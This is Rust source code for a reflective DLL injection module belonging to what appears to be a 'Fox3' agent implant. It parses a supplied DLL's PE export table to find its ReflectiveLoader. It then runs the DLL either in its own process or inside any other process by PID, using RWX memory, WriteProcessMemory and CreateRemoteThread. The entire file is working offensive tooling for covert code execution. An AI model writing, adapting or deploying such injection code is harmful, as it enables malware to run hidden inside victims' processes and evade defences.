/// Reflective DLL injection module for Fox3 simple_agent.
///
/// # Protocol
/// - `bytes`  = base64-encoded raw DLL PE file with a `ReflectiveLoader` named export
/// - `pid`    = 0 → inject into the current process
/// - `pid`    = N → remote; allocate in target, call via CreateRemoteThread
///
/// The `ReflectiveLoader` export is a position-independent function that
/// maps the DLL itself into memory, resolves imports, and calls DllMain.
/// We do NOT free the initial allocation — the loader reallocates internally.

/// Public entry point (Windows only).
pub fn execute(dll: &[u8], pid: u32) -> anyhow::Result<String> {
    #[cfg(windows)]
    { imp::exec_rdll(dll, pid) }
    #[cfg(not(windows))]
    { let _ = (dll, pid); anyhow::bail!("rdll: Windows only") }
}

#[cfg(windows)]
mod imp {
    use std::ffi::c_void;
    use std::ptr;

    const MEM_COMMIT:         u32 = 0x00001000;
    const MEM_RESERVE:        u32 = 0x00002000;
    const MEM_RELEASE:        u32 = 0x00008000;
    const PAGE_RWX:           u32 = 0x40;
    const PROCESS_ALL_ACCESS: u32 = 0x001F_0FFF;
    const INFINITE:           u32 = 0xFFFF_FFFF;

    extern "system" {
        fn VirtualAlloc(addr: *mut c_void, size: usize, alloc_type: u32, protect: u32) -> *mut c_void;
        fn VirtualFree(addr: *mut c_void, size: usize, free_type: u32) -> i32;
        fn VirtualAllocEx(proc: *mut c_void, addr: *mut c_void, size: usize, alloc_type: u32, protect: u32) -> *mut c_void;
        fn WriteProcessMemory(proc: *mut c_void, base: *mut c_void, buf: *const c_void, size: usize, written: *mut usize) -> i32;
        fn CreateThread(attrs: *mut c_void, stack: usize, start: *mut c_void, param: *mut c_void, flags: u32, id: *mut u32) -> *mut c_void;
        fn CreateRemoteThread(proc: *mut c_void, attrs: *mut c_void, stack: usize, start: *mut c_void, param: *mut c_void, flags: u32, id: *mut u32) -> *mut c_void;
        fn OpenProcess(access: u32, inherit: i32, pid: u32) -> *mut c_void;
        fn WaitForSingleObject(handle: *mut c_void, ms: u32) -> u32;
        fn CloseHandle(handle: *mut c_void) -> i32;
        fn GetLastError() -> u32;
    }

    pub fn exec_rdll(dll: &[u8], pid: u32) -> anyhow::Result<String> {
        let loader_rva = find_reflective_loader(dll)?;
        let len = dll.len();

        if pid == 0 || pid == std::process::id() {
            // Self-injection: alloc RWX, copy DLL, call ReflectiveLoader via thread
            let mem = unsafe {
                VirtualAlloc(ptr::null_mut(), len, MEM_COMMIT | MEM_RESERVE, PAGE_RWX)
            };
            if mem.is_null() {
                anyhow::bail!("rdll/self: VirtualAlloc failed ({})", unsafe { GetLastError() });
            }
            unsafe {
                ptr::copy_nonoverlapping(dll.as_ptr(), mem as *mut u8, len);
                let loader_ptr = (mem as usize + loader_rva) as *mut c_void;
                let mut tid = 0u32;
                let t = CreateThread(ptr::null_mut(), 0, loader_ptr, ptr::null_mut(), 0, &mut tid);
                if t.is_null() {
                    VirtualFree(mem, 0, MEM_RELEASE);
                    anyhow::bail!("rdll/self: CreateThread failed ({})", GetLastError());
                }
                WaitForSingleObject(t, INFINITE);
                CloseHandle(t);
                // Do NOT free mem — ReflectiveLoader reallocates internally.
            }
            Ok(format!("rdll/self: ReflectiveLoader called (RVA 0x{:x}, {} bytes)", loader_rva, len))
        } else {
            // Remote injection: allocate in target, write DLL, call loader
            unsafe {
                let hp = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
                if hp.is_null() {
                    anyhow::bail!("rdll/remote: OpenProcess({}) failed ({})", pid, GetLastError());
                }
                let mem = VirtualAllocEx(hp, ptr::null_mut(), len, MEM_COMMIT | MEM_RESERVE, PAGE_RWX);
                if mem.is_null() {
                    CloseHandle(hp);
                    anyhow::bail!("rdll/remote: VirtualAllocEx failed ({})", GetLastError());
                }
                let mut written = 0usize;
                WriteProcessMemory(hp, mem, dll.as_ptr() as _, len, &mut written);
                let loader_abs = (mem as usize + loader_rva) as *mut c_void;
                let mut tid = 0u32;
                let t = CreateRemoteThread(hp, ptr::null_mut(), 0, loader_abs, ptr::null_mut(), 0, &mut tid);
                if t.is_null() {
                    CloseHandle(hp);
                    anyhow::bail!("rdll/remote: CreateRemoteThread failed ({})", GetLastError());
                }
                WaitForSingleObject(t, INFINITE);
                CloseHandle(t);
                CloseHandle(hp);
            }
            Ok(format!("rdll/remote: PID {} ReflectiveLoader called (RVA 0x{:x})", pid, loader_rva))
        }
    }

    /// Parse the PE export table and return the `ReflectiveLoader` export RVA.
    fn find_reflective_loader(dll: &[u8]) -> anyhow::Result<usize> {
        if dll.len() < 0x40 || &dll[0..2] != b"MZ" {
            anyhow::bail!("rdll: not a valid PE (no MZ magic)");
        }
        let pe_off = u32::from_le_bytes(dll[0x3C..0x40].try_into()?) as usize;
        if dll.len() < pe_off + 4 || &dll[pe_off..pe_off+4] != b"PE\0\0" {
            anyhow::bail!("rdll: invalid PE signature");
        }
        // Optional header starts at pe_off + 4 (COFF header 20 bytes) + 20 = pe_off + 24
        let opt_off = pe_off + 24;
        if dll.len() < opt_off + 2 { anyhow::bail!("rdll: truncated optional header"); }
        let magic = u16::from_le_bytes(dll[opt_off..opt_off+2].try_into()?);
        // Export data directory: offset 0x70 for PE32+ (0x20B), 0x60 for PE32
        let exp_dd_off = opt_off + if magic == 0x20B { 0x70 } else { 0x60 };
        if dll.len() < exp_dd_off + 8 { anyhow::bail!("rdll: no export data directory"); }
        let exp_rva = u32::from_le_bytes(dll[exp_dd_off..exp_dd_off+4].try_into()?) as usize;
        if exp_rva == 0 { anyhow::bail!("rdll: empty export directory"); }
        if dll.len() < exp_rva + 40 { anyhow::bail!("rdll: export directory truncated"); }

        let n_names    = u32::from_le_bytes(dll[exp_rva+24..exp_rva+28].try_into()?) as usize;
        let addr_funcs = u32::from_le_bytes(dll[exp_rva+28..exp_rva+32].try_into()?) as usize;
        let addr_names = u32::from_le_bytes(dll[exp_rva+32..exp_rva+36].try_into()?) as usize;
        let addr_ords  = u32::from_le_bytes(dll[exp_rva+36..exp_rva+40].try_into()?) as usize;

        for i in 0..n_names {
            let name_rva = u32::from_le_bytes(
                dll[addr_names + i*4..addr_names + i*4 + 4].try_into()?
            ) as usize;
            let end = dll[name_rva..].iter().position(|&b| b == 0).unwrap_or(0);
            if &dll[name_rva..name_rva+end] == b"ReflectiveLoader" {
                let ord = u16::from_le_bytes(
                    dll[addr_ords + i*2..addr_ords + i*2 + 2].try_into()?
                ) as usize;
                let func_rva = u32::from_le_bytes(
                    dll[addr_funcs + ord*4..addr_funcs + ord*4 + 4].try_into()?
                ) as usize;
                return Ok(func_rva);
            }
        }
        anyhow::bail!("rdll: ReflectiveLoader export not found in PE")
    }
}
